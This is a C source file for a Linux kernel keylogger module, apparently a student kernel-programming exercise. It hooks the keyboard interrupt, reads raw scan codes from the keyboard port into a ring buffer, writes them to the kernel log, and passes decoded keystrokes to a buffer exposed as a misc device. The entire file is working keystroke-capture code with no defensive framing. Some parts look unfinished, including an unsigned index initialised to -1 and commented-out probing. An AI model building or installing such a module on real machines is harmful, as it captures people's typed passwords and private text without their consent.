#include "keyboard.h"

static char *id = "keyboard";

static unsigned int scan_array[SIZE];

DEFINE_RWLOCK(keyboard_rwlock);

static unsigned int windex = -1;

static unsigned int rindex = 0;

static struct miscdevice keylogger_misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "module_keylogger",
	.fops = &keylogger_misc_fops,
};

/* Assumption : if windex overrun rindex then static size is too small  */
/* To be revised */

static void do_tasklet(unsigned long unused)
{
	unsigned int packet = 0;
	unsigned int target = 0; 

	target = (windex >= rindex) ? windex : SIZE;
	while (rindex <= target)
	{
		read_lock(&keyboard_rwlock);
		packet = scan_array[rindex++];
		/*packet = scan_array[windex]; */
		read_unlock(&keyboard_rwlock);
		printk(KERN_INFO "tasklet : [%x]\n", packet);
		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
			target = windex;
		scan_fsm_update(&scan_fsm, packet);
		if (scan_fsm.state == SUCCESS)
			scan_fsm_send(&scan_fsm, keystroke_array);
		else if (scan_fsm.state == ERROR)
			scan_fsm_clear(&scan_fsm);	
		/* state machine
		 *  if SUCCESS, format packet and send it to buffer
		 *  if ERROR, flush fsm
		 */
		
	}
}
DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);


/* Assumption : an interrupt handler shouldn't be intterupted by another one on same line */

irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
{
	unsigned int scan_code = 0;

	/* clearing bit for interrupts ? */
	/* get time of day */
	scan_code = inb(KEYBOARD_PORT);
	if (scan_code) {
		/* format packet */
		if (windex + 1 >= SIZE)
			windex = -1;
		write_lock(&keyboard_rwlock);
		scan_array[++windex] = scan_code;
		write_unlock(&keyboard_rwlock);
		tasklet_schedule(&keyboard_tasklet);
	}
	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
	int		result;
/*	unsigned int	r; */
	unsigned int	try = 0;
	unsigned int	scan_set = 0;

	result = misc_register(&keylogger_misc);
	if (result) {
		printk(KERN_INFO "misc keylogger : register failed with %d\n", result);
		goto err;
	}
	else {
		printk(KERN_INFO "misc keylogger : register successful\n");
	}

	result = request_irq(KEYBOARD_IRQ, keyboard_interrupt, IRQF_SHARED, "keyboard-driver", id);
	if (result) {
		printk(KERN_INFO "driver keylogger : IRQ register failed");
		
		goto err;
	}
	
	/* Read Status Byte or IRQ ? */
/*	outb(SCAN_SET, KEYBOARD_PORT);
	r = inb(KEYBOARD_PORT);
	printk(KERN_INFO "after SCAN_SET, caught [%x]\n", r);
	outb(SCAN_SET_DATA, KEYBOARD_PORT);
	r = inb(KEYBOARD_PORT);
	printk(KERN_INFO "after SCAN_SET_DATA, caught [%x]\n", r);
	r = inb(KEYBOARD_PORT);
	printk(KERN_INFO "caught [%x]\n", r);
*/
	
	return result;

err:
	misc_deregister(&keylogger_misc);
	free_irq(KEYBOARD_IRQ, id);
	return result;
}

static void __exit keylogger_cleanup(void)
{
	misc_deregister(&keylogger_misc);
	printk(KERN_INFO "keylogger module : deregister\n");

/*	void driver_register(struct device_driver *drv) */

	free_irq(KEYBOARD_IRQ, id);
}

module_init(keylogger_init);
module_exit(keylogger_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Antoine Riard <ariard@student.42.fr>");
MODULE_DESCRIPTION("keylogger module");
